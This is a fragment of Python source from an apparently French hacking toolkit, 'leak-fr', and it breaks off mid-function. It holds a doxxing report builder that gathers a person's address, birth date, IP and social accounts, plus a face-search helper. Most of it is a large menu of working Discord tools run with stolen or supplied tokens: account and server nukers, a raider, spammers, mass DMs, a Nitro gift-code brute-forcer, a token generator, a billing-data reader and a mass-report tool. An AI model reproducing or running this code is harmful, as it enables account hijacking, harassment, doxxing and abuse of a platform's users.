
def osint_face_recon():
    banner_s("FACE RECON")
    img_input = input(f"  {W}Image URL: {RST}").strip()
    import urllib.parse
    img_url = img_input if img_input.startswith("http") else ""
    engines = [
        ("Google Lens",   f"https://lens.google.com/uploadbyurl?url={urllib.parse.quote(img_url)}"),
        ("Yandex Images", f"https://yandex.com/images/search?rpt=imageview&url={urllib.parse.quote(img_url)}"),
        ("Bing Visual",   f"https://www.bing.com/images/search?q=imgurl:{urllib.parse.quote(img_url)}"),
        ("TinEye",        f"https://tineye.com/search?url={urllib.parse.quote(img_url)}"),
        ("FaceCheck.ID",  f"https://facecheck.id/#?url={urllib.parse.quote(img_url)}"),
    ]
    print(f"\n  {Y}REVERSE IMAGE SEARCH LINKS:{RST}\n ")
    for name, link in engines:
        print(f"  {G}[{name:<20}]{RST}  {DIM}{link[:80]}{RST} ")
    if img_url:
        out = f"Image: {img_url}\n\n" + "".join(f"{n}: {l}\n" for n, l in engines)
        save_out("facerecon.txt", out)
        print(f"\n{OK} Saved.")
    pause()


def osint_dox():
    banner_s("D0X CREATE")
    fields = [("full_name", "Nom complet"), ("alias", "Alias/Username"),
              ("dob", "Date de naissance"), ("age", "Age"), ("phone", "Telephone"),
              ("email", "Email"), ("address", "Adresse"), ("city", "Ville"),
              ("country", "Pays"), ("ip", "IP connue"), ("discord", "Discord tag"),
              ("instagram", "Instagram"), ("tiktok", "TikTok"), ("twitter", "Twitter/X"),
              ("github", "GitHub"), ("steam", "Steam"), ("notes", "Notes")]
    print(f"  {Y}Remplir les infos connues{RST}\n ")
    data = {}
    for key, label in fields:
        val = input(f"  {W}{label:<22}{RST}: ").strip()
        if val:
            data[key] = val
    if not data:
        print(f"{ERR} Aucune donnee. ")
        pause(); return
    target = data.get("full_name", data.get("alias", "target"))
    lines = [f"{'='*60}", f"  D0X REPORT -- {target.upper()}",
             f"  leak-fr v5.0 by 31300-leak-fr", f"{'='*60}", " "]
    for k, v in data.items():
        lines.append(f"  {k.upper():<16}: {v}")
    lines.append(f"{'='*60}")
    out = "\n".join(lines)
    print(f"\n{out}")
    save_out(f"dox_{target.lower().replace(' ', '_')}.txt", out)
    print(f"\n{OK} D0x saved.")
    pause()


def osint_steam_id():
    banner_s("STEAM ID CONVERTER")
    raw = input(f"  {W}SteamID64 ou vanity URL: {RST}").strip()
    try:
        if raw.isdigit() and len(raw) == 17:
            sid64 = int(raw)
            sid32 = sid64 - 76561197960265728
            y = sid32 % 2; z = sid32 // 2
            steam_id = f"STEAM_0:{y}:{z}"
            steam_id3 = f"[U:1:{sid32}]"
            print(f"\n  {Y}SteamID64 {RST}: {W}{sid64}{RST} ")
            print(f"  {Y}SteamID32 {RST}: {W}{sid32}{RST} ")
            print(f"  {Y}SteamID   {RST}: {W}{steam_id}{RST} ")
            print(f"  {Y}SteamID3  {RST}: {W}{steam_id3}{RST} ")
            print(f"  {Y}Profile   {RST}: {W}https://steamcommunity.com/profiles/{sid64}{RST} ")
            save_out(f"steam_{sid64}.txt",
                     f"SteamID64:{sid64}\nSteamID:{steam_id}\nSteamID3:{steam_id3} ")
        else:
            print(f"\n  {Y}Profile   {RST}: {W}https://steamcommunity.com/id/{raw}{RST} ")
    except Exception as e:
        print(f"{ERR} {e} ")
    pause()


def osint_shodan():
    banner_s("SHODAN DORKING")
    target = input(f"  {W}IP / domaine / mot-cle: {RST}").strip()
    dorks = [
        f"https://www.shodan.io/search?query=hostname%3A{target}",
        f"https://www.shodan.io/search?query=ip%3A{target}",
        f"https://www.shodan.io/search?query=org%3A{target}",
        f"https://www.shodan.io/host/{target}",
        f"https://censys.io/ipv4/{target}",
    ]
    print(f"\n  {INF} Shodan + OSINT links pour: {Y}{target}{RST}\n ")
    for d in dorks: print(f"  {G}->{RST} {DIM}{d}{RST} ")
    save_out(f"shodan_{target[:20]}.txt", "\n".join(dorks))
    pause()


def osint_whois():
    banner_s("WHOIS LOOKUP")
    domain = input(f"  {W}Domaine: {RST}").strip()
    try:
        try:
            import whois as w
            d = w.whois(domain)
            print(f"\n  {Y}Domain     {RST}: {W}{d.domain_name}{RST} ")
            print(f"  {Y}Registrar  {RST}: {W}{d.registrar}{RST} ")
            print(f"  {Y}Created    {RST}: {W}{d.creation_date}{RST} ")
            print(f"  {Y}Expires    {RST}: {W}{d.expiration_date}{RST} ")
            print(f"  {Y}Name Srv   {RST}: {W}{d.name_servers}{RST} ")
            save_out(f"whois_{domain}.txt", str(d))
        except ImportError:
            pip("python-whois")
            print(f"{INF} Module installe. Relance le tool. ")
    except Exception:
        print(f"\n  {Y}WHOIS link{RST}: {W}https://who.is/whois/{domain}{RST} ")
    pause()


# ========================================================================
# DISCORD
# ========================================================================
def _dh(token):
    return {"Authorization": token,
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}


def discord_menu():
    while True:
        opts = [("01", "Token Info"), ("02", "Token Nuker"),
                ("03", "Token Spammer"), ("04", "Token Joiner"),
                ("05", "Token Leaver"), ("06", "Status Changer"),
                ("07", "Delete Friends"), ("08", "Block Friends"),
                ("09", "Mass DM"), ("10", "Delete DM"),
                ("11", "Server Raid"), ("12", "Token Generator"),
                ("13", "Webhook Info"), ("14", "Webhook Delete"),
                ("15", "Webhook Spammer"), ("16", "Webhook Generator"),
                ("17", "Server Nuker (Bot)"), ("18", "Server Info"),
                ("19", "Nitro Generator"), ("20", "Friend Spammer"),
                ("21", "Channel Spammer"), ("22", "Reaction Spammer"),
                ("23", "Guild List"), ("24", "Friend List"),
                ("25", "Bio Changer"), ("26", "Avatar Changer"),
                ("27", "HypeSquad"), ("28", "Token Onliner"),
                ("29", "Token to ID"), ("30", "Mass Report"),
                ("31", "Banner Changer"), ("00", "Retour")]
        menu_box("DISCORD ALL-IN-ONE", opts)
        c = input(f"  {R}>{RST} ").strip()
        if c == "01": disc_token_info()
        elif c == "02": disc_token_nuker()
        elif c == "03": disc_token_spammer()
        elif c == "04": disc_token_joiner()
        elif c == "05": disc_token_leaver()
        elif c == "06": disc_status_changer()
        elif c == "07": disc_delete_friends()
        elif c == "08": disc_block_friends()
        elif c == "09": disc_mass_dm()
        elif c == "10": disc_delete_dm()
        elif c == "11": disc_server_raid()
        elif c == "12": disc_token_gen()
        elif c == "13": disc_webhook_info()
        elif c == "14": disc_webhook_delete()
        elif c == "15": disc_webhook_spammer()
        elif c == "16": disc_webhook_gen()
        elif c == "17": disc_bot_nuker()
        elif c == "18": disc_server_info()
        elif c == "19": disc_nitro_gen()
        elif c == "20": disc_friend_spammer()
        elif c == "21": disc_channel_spammer()
        elif c == "22": disc_reaction_spammer()
        elif c == "23": disc_guilds()
        elif c == "24": disc_friends()
        elif c == "25": disc_bio_changer()
        elif c == "26": disc_avatar_changer()
        elif c == "27": disc_hypesquad()
        elif c == "28": disc_onliner()
        elif c == "29": disc_token_to_id()
        elif c == "30": disc_mass_report()
        elif c == "31": disc_banner_changer()
        elif c == "00": break


def disc_token_info():
    banner_s("TOKEN INFO")
    token = input(f"  {W}Token: {RST} ").strip()
    r = requests.get("https://discord.com/api/v9/users/@me", headers=_dh(token))
    if r.status_code == 200:
        d = r.json()
        billing = requests.get("https://discord.com/api/v9/users/@me/billing/payment-sources",
                               headers=_dh(token)).json()
        guilds = requests.get("https://discord.com/api/v9/users/@me/guilds",
                              headers=_dh(token)).json()
        nitro_map = {0: "None", 1: "Nitro Classic", 2: "Nitro", 3: "Nitro Basic"}
        print(f"\n  {Y}Username {RST}: {W}{d.get('username')}#{d.get('discriminator','0')}{RST} ")
        print(f"  {Y}ID       {RST}: {W}{d.get('id')}{RST} ")
        print(f"  {Y}Email    {RST}: {W}{d.get('email','N/A')}{RST} ")
        print(f"  {Y}Phone    {RST}: {W}{d.get('phone','N/A')}{RST} ")
        print(f"  {Y}Nitro    {RST}: {W}{nitro_map.get(d.get('premium_type',0),'?')}{RST} ")
        print(f"  {Y}Guilds   {RST}: {W}{len(guilds) if isinstance(guilds,list) else '?'}{RST} ")
        print(f"  {Y}Billing  {RST}: {W}{len(billing) if isinstance(billing,list) else 0} method(s){RST} ")
        save_out(f"disc_{d.get('id')}.txt",
                 json.dumps({"user": d, "billing": billing}, indent=2))
    else:
        print(f"\n{ERR} Invalid token. ({r.status_code}) ")
    pause()


def disc_token_nuker():
    banner_s("TOKEN NUKER")
    token = input(f"  {W}Token: {RST} ").strip(); h = _dh(token)
    print(f"\n  {Y}[1]{RST} Leave all servers ")
    print(f"  {Y}[2]{RST} Delete owned servers ")
    print(f"  {Y}[3]{RST} Delete all friends ")
    print(f"  {Y}[4]{RST} FULL NUKE ")
    mode = input(f"\n  {W}Mode: {RST} ").strip()
    if input(f"\n  {R}[!]{RST} Type {BRT}NUKE{RST} to confirm:  ") != "NUKE":
        print(f"{INF} Aborted. "); pause(); return
    guilds = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=h).json()
    if not isinstance(guilds, list):
        print(f"{ERR} Invalid token. "); pause(); return
    if mode in ["1", "4"]:
        for g in guilds:
            if not g.get("owner"):
                r = requests.delete(f"https://discord.com/api/v9/users/@me/guilds/{g['id']}", headers=h)
                print(f"  {Y}[LEAVE]{RST} {g['name']} ({r.status_code}) "); time.sleep(0.3)
    if mode in ["2", "4"]:
        for g in guilds:
            if g.get("owner"):
                r = requests.delete(f"https://discord.com/api/v9/guilds/{g['id']}", headers=h)
                print(f"  {R}[DEL]{RST}   {g['name']} ({r.status_code}) "); time.sleep(0.3)
    if mode in ["3", "4"]:
        friends = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=h).json()
        if isinstance(friends, list):
            for f in friends:
                r = requests.delete(f"https://discord.com/api/v9/users/@me/relationships/{f['id']}", headers=h)
                print(f"  {R}[DEL FRIEND]{RST} {f.get('user',{}).get('username','?')} ({r.status_code}) ")
                time.sleep(0.3)
    print(f"\n{OK} Nuke complete. "); pause()


def disc_token_spammer():
    banner_s("TOKEN SPAMMER")
    token = input(f"  {W}Token: {RST} ").strip()
    channel = input(f"  {W}Channel ID: {RST} ").strip()
    message = input(f"  {W}Message: {RST} ").strip()
    count = int(input(f"  {W}Count: {RST} ").strip() or "10")
    delay = float(input(f"  {W}Delay (s): {RST} ").strip() or "0.5")
    h = _dh(token); print()
    for i in range(1, count + 1):
        r = requests.post(f"https://discord.com/api/v9/channels/{channel}/messages",
                          headers=h, json={"content": message})
        col = G if r.status_code == 200 else R
        print(f"  {col}[{i}/{count}]{RST}  {r.status_code} "); time.sleep(delay)
    pause()


def disc_token_joiner():
    banner_s("TOKEN JOINER")
    token = input(f"  {W}Token: {RST} ").strip()
    invite = input(f"  {W}Invite code: {RST} ").strip().split("/")[-1]
    r = requests.post(f"https://discord.com/api/v9/invites/{invite}", headers=_dh(token), json={})
    if r.status_code == 200:
        print(f"\n{OK} Joined: {G}{r.json().get('guild',{}).get('name','?')}{RST} ")
    else:
        print(f"\n{ERR} Failed. ({r.status_code}) {r.text[:200]} ")
    pause()


def disc_token_leaver():
    banner_s("TOKEN LEAVER")
    token = input(f"  {W}Token: {RST}").strip()
    gid = input(f"  {W}Server ID: {RST}").strip()
    r = requests.delete(f"https://discord.com/api/v9/users/@me/guilds/{gid}", headers=_dh(token))
    print(f"\n{OK if r.status_code == 204 else ERR} {r.status_code}"); pause()


def disc_status_changer():
    banner_s("STATUS CHANGER")
    token = input(f"  {W}Token: {RST} ").strip()
    print(f"  {Y}[1]{RST} online  {Y}[2]{RST} idle  {Y}[3]{RST} dnd  {Y}[4]{RST} invisible ")
    mode = input(f"  {W}Status: {RST} ").strip()
    status_map = {"1": "online", "2": "idle", "3": "dnd", "4": "invisible"}
    status = status_map.get(mode, "online")
    custom = input(f"  {W}Custom status text (blank=none): {RST} ").strip()
    payload = {"status": status}
    if custom: payload["custom_status"] = {"text": custom}
    r = requests.patch("https://discord.com/api/v9/users/@me/settings",
                       headers=_dh(token), json=payload)
    print(f"\n{OK if r.status_code == 200 else ERR} Status set to {status} ({r.status_code}) ")
    pause()


def disc_delete_friends():
    banner_s("DELETE FRIENDS")
    token = input(f"  {W}Token: {RST} ").strip(); h = _dh(token)
    friends = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=h).json()
    if not isinstance(friends, list):
        print(f"{ERR} Invalid. "); pause(); return
    print(f"{OK} Found {len(friends)} relationships. ")
    if input(f"  {R}[!]{RST} Type {BRT}CONFIRM{RST}:  ") != "CONFIRM":
        pause(); return
    for f in friends:
        r = requests.delete(f"https://discord.com/api/v9/users/@me/relationships/{f['id']}", headers=h)
        print(f"  {R}[DEL]{RST} {f.get('user',{}).get('username','?')} ({r.status_code}) ")
        time.sleep(0.3)
    pause()


def disc_block_friends():
    banner_s("BLOCK FRIENDS")
    token = input(f"  {W}Token: {RST} ").strip(); h = _dh(token)
    friends = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=h).json()
    if not isinstance(friends, list):
        print(f"{ERR} Invalid. "); pause(); return
    for f in friends:
        if f.get("type") == 1:
            uid = f.get("user", {}).get("id")
            r = requests.put(f"https://discord.com/api/v9/users/@me/relationships/{uid}",
                             headers=h, json={"type": 2})
            print(f"  {R}[BLOCKED]{RST} {f.get('user',{}).get('username','?')} ({r.status_code}) ")
            time.sleep(0.3)
    pause()


def disc_mass_dm():
    banner_s("MASS DM")
    token = input(f"  {W}Token: {RST} ").strip()
    message = input(f"  {W}Message: {RST} ").strip()
    ids_raw = input(f"  {W}User IDs (comma): {RST} ").strip()
    user_ids = [u.strip() for u in ids_raw.split(",") if u.strip()]
    h = _dh(token); print()
    for uid in user_ids:
        try:
            dm = requests.post("https://discord.com/api/v9/users/@me/channels",
                               headers=h, json={"recipient_id": uid})
            if dm.status_code == 200:
                cid = dm.json()["id"]
                msg = requests.post(f"https://discord.com/api/v9/channels/{cid}/messages",
                                    headers=h, json={"content": message})
                col = G if msg.status_code == 200 else R
                print(f"  {col}[{uid}]{RST} -> {msg.status_code} ")
            else:
                print(f"  {R}[{uid}]{RST} DM failed ({dm.status_code}) ")
        except Exception as e:
            print(f"  {R}[{uid}]{RST} {e} ")
        time.sleep(0.6)
    pause()


def disc_delete_dm():
    banner_s("DELETE DM")
    token = input(f"  {W}Token: {RST} ").strip(); h = _dh(token)
    dms = requests.get("https://discord.com/api/v9/users/@me/channels", headers=h).json()
    if not isinstance(dms, list):
        print(f"{ERR} Invalid. "); pause(); return
    print(f"{OK} Found {len(dms)} DM channels. ")
    for dm in dms:
        cid = dm.get("id")
        r = requests.delete(f"https://discord.com/api/v9/channels/{cid}", headers=h)
        name = (dm.get("recipients") or [{}])[0].get("username", "?")
        print(f"  {R}[DEL]{RST} {name} ({r.status_code}) "); time.sleep(0.3)
    pause()


def disc_server_raid():
    banner_s("SERVER RAID")
    token = input(f"  {W}Token: {RST} ").strip()
    gid = input(f"  {W}Server ID: {RST} ").strip()
    channel = input(f"  {W}Channel ID: {RST} ").strip()
    message = input(f"  {W}Raid message: {RST} ").strip()
    count = int(input(f"  {W}Message count: {RST} ").strip() or "20")
    h = _dh(token); print()
    for i in range(3):
        r = requests.post(f"https://discord.com/api/v9/guilds/{gid}/channels",
                          headers=h, json={"name": f"raided-by-leakfr-{i}", "type": 0})
        print(f"  {Y}[CHANNEL]{RST} create ({r.status_code}) "); time.sleep(0.4)
    for i in range(1, count + 1):
        r = requests.post(f"https://discord.com/api/v9/channels/{channel}/messages",
                          headers=h, json={"content": f"@everyone {message}"})
        col = G if r.status_code == 200 else R
        print(f"  {col}[{i}/{count}]{RST} {r.status_code} "); time.sleep(0.3)
    pause()


def disc_token_gen():
    banner_s("TOKEN GENERATOR")
    count = int(input(f"  {W}Count: {RST} ").strip() or "10")
    chars = string.ascii_letters + string.digits + "-_"; print(); tokens = []
    for _ in range(count):
        p1 = base64.b64encode(str(random.randint(100000000000000000,
                                                  999999999999999999)).encode()).decode().rstrip("=")
        p2 = "".join(random.choices(chars, k=6))
        p3 = "".join(random.choices(chars, k=27))
        tok = f"{p1}.{p2}.{p3}"
        print(f"  {Y}{tok}{RST} "); tokens.append(tok)
    save_out("tokens_gen.txt", "\n".join(tokens)); pause()


def disc_webhook_info():
    banner_s("WEBHOOK INFO")
    wh = input(f"  {W}Webhook URL: {RST}").strip()
    d = jget(wh); print(); pkv(d); pause()


def disc_webhook_delete():
    banner_s("WEBHOOK DELETE")
    wh = input(f"  {W}Webhook URL: {RST}").strip()
    r = requests.delete(wh)
    print(f"\n{OK if r.status_code == 204 else ERR} {r.status_code}"); pause()


def disc_webhook_spammer():
    banner_s("WEBHOOK SPAMMER")
    wh = input(f"  {W}Webhook URL: {RST} ").strip()
    message = input(f"  {W}Message: {RST} ").strip()
    count = int(input(f"  {W}Count: {RST} ").strip() or "10")
    delay = float(input(f"  {W}Delay (s): {RST} ").strip() or "0.5")
    print()
    for i in range(1, count + 1):
        r = requests.post(wh, json={"content": message})
        col = G if r.status_code == 204 else R
        print(f"  {col}[{i}/{count}]{RST}  {r.status_code} "); time.sleep(delay)
    pause()


def disc_webhook_gen():
    banner_s("WEBHOOK GENERATOR")
    token = input(f"  {W}Token: {RST} ").strip()
    channel = input(f"  {W}Channel ID: {RST} ").strip()
    name = input(f"  {W}Webhook name: {RST} ").strip() or "leakfr"
    count = int(input(f"  {W}Count: {RST} ").strip() or "3")
    h = _dh(token); print(); hooks = []
    for i in range(count):
        r = requests.post(f"https://discord.com/api/v9/channels/{channel}/webhooks",
                          headers=h, json={"name": f"{name}-{i}"})
        if r.status_code == 200:
            url = r.json().get("url", "?")
            print(f"  {G}[CREATED]{RST} {url} "); hooks.append(url)
        else:
            print(f"  {R}[FAIL]{RST} {r.status_code} ")
        time.sleep(0.4)
    if hooks: save_out("webhooks_created.txt", "\n".join(hooks))
    pause()


def disc_bot_nuker():
    banner_s("SERVER NUKER (BOT)")
    token = input(f"  {W}Bot Token: {RST} ").strip()
    gid = input(f"  {W}Server ID: {RST} ").strip()
    h = {"Authorization": f"Bot {token}", "Content-Type": "application/json"}
    if input(f"\n  {R}[!]{RST} Type {BRT}NUKE{RST} to confirm:  ") != "NUKE":
        pause(); return
    channels = requests.get(f"https://discord.com/api/v9/guilds/{gid}/channels", headers=h).json()
    if isinstance(channels, list):
        for ch in channels:
            r = requests.delete(f"https://discord.com/api/v9/channels/{ch['id']}", headers=h)
            print(f"  {R}[DEL CHANNEL]{RST} {ch.get('name','?')} ({r.status_code}) ")
            time.sleep(0.3)
    for i in range(5):
        requests.post(f"https://discord.com/api/v9/guilds/{gid}/channels",
                      headers=h, json={"name": f"nuked-by-leakfr-{i}", "type": 0})
        time.sleep(0.3)
    print(f"\n{OK} Server nuked. "); pause()


def disc_server_info():
    banner_s("SERVER INFO")
    token = input(f"  {W}Token: {RST} ").strip()
    gid = input(f"  {W}Server ID: {RST} ").strip()
    d = requests.get(f"https://discord.com/api/v9/guilds/{gid}?with_counts=true",
                     headers=_dh(token)).json()
    if "code" in d:
        print(f"{ERR} {d.get('message')} "); pause(); return
    print(f"\n  {Y}Name      {RST}: {W}{d.get('name')}{RST} ")
    print(f"  {Y}Owner     {RST}: {W}{d.get('owner_id')}{RST} ")
    print(f"  {Y}Members   {RST}: {W}{d.get('approximate_member_count','?')}{RST} ")
    print(f"  {Y}Online    {RST}: {W}{d.get('approximate_presence_count','?')}{RST} ")
    save_out(f"server_{gid}.txt", json.dumps(d, indent=2)); pause()


def disc_nitro_gen():
    banner_s("NITRO GENERATOR")
    count = int(input(f"  {W}Count: {RST} ").strip() or "10")
    check = input(f"  {W}Check? (y/n): {RST} ").strip().lower() == "y"
    chars = string.ascii_letters + string.digits; print(); valid = []
    for i in range(1, count + 1):
        code = "".join(random.choices(chars, k=16)); url = f"https://discord.gift/{code}"
        if check:
            r = requests.get(f"https://discord.com/api/v9/entitlements/gift-codes/{code}", timeout=4)
            ok = r.status_code == 200
            tag = f"{G}[VALID]{RST} " if ok else f"{R}[INVALID]{RST} "
            print(f"  {tag}  {url} ")
            if ok: valid.append(url)
        else:
            print(f"  {Y}[GEN]{RST}   {url} "); valid.append(url)
        time.sleep(0.15)
    save_out("nitro_gen.txt", "\n".join(valid)); pause()


def disc_friend_spammer():
    banner_s("FRIEND SPAMMER")
    token = input(f"  {W}Token: {RST} ").strip(); h = _dh(token)
    friends = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=h).json()
    if not isinstance(friends, list):
        print(f"{ERR} Invalid. "); pause(); return
    message = input(f"  {W}Message: {RST} ").strip()
    print()
    for f in friends:
        if f.get("type") == 1:
            uid = f.get("user", {}).get("id")
            try:
                dm = requests.post("https://discord.com/api/v9/users/@me/channels",
                                   headers=h, json={"recipient_id": uid})
                if dm.status_code == 200:
                    cid = dm.json()["id"]
                    msg = requests.post(f"https://discord.com/api/v9/channels/{cid}/messages",
                                        headers=h, json={"content": message})
                    print(f"  {G}[DM]{RST} {f.get('user',{}).get('username','?')} -> {msg.status_code} ")
            except Exception as e:
                print(f"  {R}[ERR]{RST} {e} ")
            time.sleep(0.6)
    pause()


def disc_channel_spammer():
    banner_s("CHANNEL SPAMMER")
    token = input(f"  {W}Token: {RST} ").strip()
    channel = input(f"  {W}Channel ID: {RST} ").strip()
    msgs_raw = input(f"  {W}Messages (comma sep, blank=default): {RST} ").strip()
    msgs = ([m.strip() for m in msgs_raw.split(",") if m.strip()]
            or ["@everyone", "leak-fr", "RAIDED"])
    count = int(input(f"  {W}Total sends: {RST} ").strip() or "20")
    delay = float(input(f"  {W}Delay (s): {RST} ").strip() or "0.3")
    h = _dh(token); print()
    for i in range(1, count + 1):
        msg = random.choice(msgs)
        r = requests.post(f"https://discord.com/api/v9/channels/{channel}/messages",
                          headers=h, json={"content": msg})
        col = G if r.status_code == 200 else R
        print(f"  {col}[{i}/{count}]{RST}  {r.status_code}  {DIM}{msg[:30]}{RST} ")
        time.sleep(delay)
    pause()


def disc_reaction_spammer():
    banner_s("REACTION SPAMMER")
    token = input(f"  {W}Token: {RST} ").strip()
    channel = input(f"  {W}Channel ID: {RST} ").strip()
    msg_id = input(f"  {W}Message ID: {RST} ").strip()
    emoji = input(f"  {W}Emoji: {RST} ").strip()
    count = int(input(f"  {W}Count: {RST} ").strip() or "10")
    h = _dh(token)
    import urllib.parse
    enc = urllib.parse.quote(emoji); print()
    for i in range(1, count + 1):
        r = requests.put(
            f"https://discord.com/api/v9/channels/{channel}/messages/{msg_id}/reactions/{enc}/@me",
            headers=h)
        col = G if r.status_code == 204 else R
        print(f"  {col}[{i}/{count}]{RST}  {r.status_code} "); time.sleep(0.3)
    pause()


def disc_guilds():
    banner_s("GUILD LIST")
    token = input(f"  {W}Token: {RST} ").strip()
    r = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=_dh(token))
    if r.status_code != 200:
        print(f"{ERR} {r.status_code} "); pause(); return
    print(); lines = []
    for g in r.json():
        owner = f"{G}[OWNER]{RST} " if g.get("owner") else f"{DIM}[MBR]  {RST} "
        print(f"  {owner}  {W}{g.get('name'):<30}{RST}  {DIM}{g.get('id')}{RST} ")
        lines.append(f"{'[OWNER]' if g.get('owner') else '[MEMBER]'} "
                     f"{g.get('name')} ({g.get('id')})")
    save_out("disc_guilds.txt", "\n".join(lines)); pause()


def disc_friends():
    banner_s("FRIEND LIST")
    token = input(f"  {W}Token: {RST} ").strip()
    r = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=_dh(token))
    if r.status_code != 200:
        print(f"{ERR} {r.status_code} "); pause(); return
    print(); lines = []
    for f in r.json():
        u = f.get("user", {})
        rtype = {1: "Friend", 2: "Blocked", 3: "Incoming", 4: "Outgoing"}.get(f.get("type"), "?")
        print(f"  {G}[{rtype}]{RST}  {W}{u.get('username')}#{u.get('discriminator','0')}{RST}  "
              f"{DIM}{u.get('id')}{RST} ")
        lines.append(f"[{rtype}] {u.get('username')}#{u.get('discriminator','0')} ({u.get('id')})")
    save_out("disc_friends.txt", "\n".join(lines)); pause()


def disc_bio_changer():
    banner_s("BIO CHANGER")
    token = input(f"  {W}Token: {RST}").strip()
    bio = input(f"  {W}Nouvelle bio: {RST}").strip()
    r = requests.patch("https://discord.com/api/v9/users/@me",
                       headers=_dh(token), json={"bio": bio})
    print(f"\n{OK if r.status_code == 200 else ERR} {r.status_code}")
    pause()


def disc_avatar_changer():
    banner_s("AVATAR CHANGER")
    token = input(f"  {W}Token: {RST}").strip()
    img_path = input(f"  {W}Chemin image: {RST}").strip()
    try:
        with open(img_path, "rb") as f: data = f.read()
        ext = os.path.splitext(img_path)[1].lower().replace(".", "")
        if ext == "jpg": ext = "jpeg"
        b64 = base64.b64encode(data).decode()
        avatar = f"data:image/{ext};base64,{b64}"
        r = requests.patch("https://discord.com/api/v9/users/@me",
                           headers=_dh(token), json={"avatar": avatar})
        print(f"\n{OK if r.status_code == 200 else ERR} {r.status_code} ")
    except Exception as e: print(f"{ERR} {e} ")
    pause()


def disc_banner_changer():
    banner_s("BANNER CHANGER")
    token = input(f"  {W}Token: {RST}").strip()
    img_path = input(f"  {W}Chemin image: {RST}").strip()
    try:
        with open(img_path, "rb") as f: data = f.read()
        ext = os.path.splitext(img_path)[1].lower().replace(".", "")
        if ext == "jpg": ext = "jpeg"
        b64 = base64.b64encode(data).decode()
        banner_data = f"data:image/{ext};base64,{b64}"
        r = requests.patch("https://discord.com/api/v9/users/@me",
                           headers=_dh(token), json={"banner": banner_data})
        print(f"\n{OK if r.status_code == 200 else ERR} {r.status_code} ")
    except Exception as e: print(f"{ERR} {e} ")
    pause()


def disc_hypesquad():
    banner_s("HYPESQUAD CHANGER")
    token = input(f"  {W}Token: {RST}").strip()
    print(f"\n  {Y}[1]{RST} Bravery  {Y}[2]{RST} Brilliance  {Y}[3]{RST} Balance ")
    c = input(f"  {W}Choix: {RST}").strip()
    house_map = {"1": 1, "2": 2, "3": 3}
    house = house_map.get(c, 1)
    r = requests.post("https://discord.com/api/v9/hypesquad/online",
                      headers=_dh(token), json={"house_id": house})
    names = {1: "Bravery", 2: "Brilliance", 3: "Balance"}
    print(f"\n{OK if r.status_code == 204 else ERR} -> {G}{names.get(house,'?')}{RST}")
    pause()


def disc_onliner():
    banner_s("TOKEN ONLINER")
    token = input(f"  {W}Token: {RST}").strip()
    duration = int(input(f"  {W}Duree secondes (0=infini): {RST}").strip() or "0")
    print(f"\n{INF} Token garde en ligne... Ctrl+C pour stopper.\n ")
    h = _dh(token)
    start = time.time(); count = 0
    try:
        while True:
            r = requests.get("https://discord.com/api/v9/users/@me", headers=h, timeout=5)
            count += 1
            elapsed = int(time.time() - start)
            print(f"\r  {G}[ONLINE]{RST}  ping #{count}  {elapsed}s  status:{r.status_code} ",
                  end=" ")
            if duration > 0 and elapsed >= duration: break
            time.sleep(30)
    except KeyboardInterrupt:
        pass
    print(f"\n\n{OK} Stoppe apres {count} pings. ")
    pause()


def disc_token_to_id():
    banner_s("TOKEN TO ID")
    token = input(f"  {W}Token: {RST}").strip()
    try:
        part1 = token.split(".")[0]
        part1 += "=" * ((4 - len(part1) % 4) % 4)
        decoded = base64.b64decode(part1).decode()
        print(f"\n  {Y}User ID  {RST}: {G}{decoded}{RST} ")
        try:
            uid = int(decoded)
            ts = (uid >> 22) + 1420070400000
            dt = datetime.fromtimestamp(ts / 1000).strftime("%Y-%m-%d %H:%M:%S")
            print(f"  {Y}Created  {RST}: {W}{dt}{RST} ")
        except Exception:
            pass
    except Exception as e: print(f"{ERR} {e} ")
    pause()


def disc_mass_report():
    banner_s("MASS REPORT")
    tokens_path = input(f"  {W}Fichier tokens .txt: {RST}").strip()
    target_id = input(f"  {W}User ID a reporter: {RST}").strip()
    msg_id = input(f"  {W}Message ID (opt): {RST}").strip()
    channel_id = input(f"  {W}Channel ID (opt): {RST}").strip()
    reason = input(f"  {W}Raison (1=spam 2=harassment 3=inappropriate): {RST}").strip()
    reason_map = {"1": 0, "2": 1, "3": 2}
    reason_id = reason_map.get(reason, 0)
    if not os.path.isfile(tokens_path):
        print(f"{ERR} Fichier introuvable. "); pause(); return
    with open(tokens_path, encoding="utf-8", errors="ignore") as f:
        tokens = [l.strip() for l in f if l.strip()]
    print(f"\n{INF} Report avec {len(tokens)} tokens...\n ")
    success = 0
    for token in tokens:
        try:
            payload = {"version": "1.0", "variant": "1", "language": "fr",
                       "breadcrumbs": [reason_id], "elements": {},
                       "name": "human_profile", "reporter_id": None}
            if msg_id and channel_id:
                payload["message_id"] = msg_id
                payload["channel_id"] = channel_id
            r = requests.post(f"https://discord.com/api/v9/reporting/user/{target_id}",
                              headers=_dh(token), json=payload, timeout=5)
            col = G if r.status_code in [200, 201, 204] else R
            print(f"  {col}[{r.status_code}]{RST}  {DIM}{token[:30]}...{RST} ")
            if r.status_code in [200, 201, 204]: success += 1
        except Exception as e: print(f"  {R}[ERR]{RST} {e} ")
        time.sleep(0.5)
    print(f"\n{OK} {G}{success}{RST}/{len(tokens)} reports envoyes. ")
    pause()


# ========================================================================
# VC DISCORD TOOLS (Gateway websocket)
# ========================================================================
def _vc_ws_join(token, guild_id, channel_id, hold_seconds=3):
    try:
        import websocket
    except ImportError:
        pip("websocket-client")
        try:
            import websocket
        except ImportError:
            return False, "websocket-client indisponible"
    try:
        ws = websocket.create_connection("wss://gateway.discord.gg/?v=9&encoding=json",
                                          timeout=10)
    except Exception as e:
        return False, f"gateway connect fail: {e}"
    try:
        hello = json.loads(ws.recv())
        hb_interval = hello.get("d", {}).get("heartbeat_interval", 45000) / 1000.0
    except Exception:
        hb_interval = 45.0
    stop_hb = {"v": False}

    def _hb():
        while not stop_hb["v"]:
            try:
                ws.send(json.dumps({"op": 1, "d": None}))
            except Exception:
                return
            time.sleep(hb_interval)

    threading.Thread(target=_hb, daemon=True).start()
    try:
        ws.send(json.dumps({
            "op": 2,
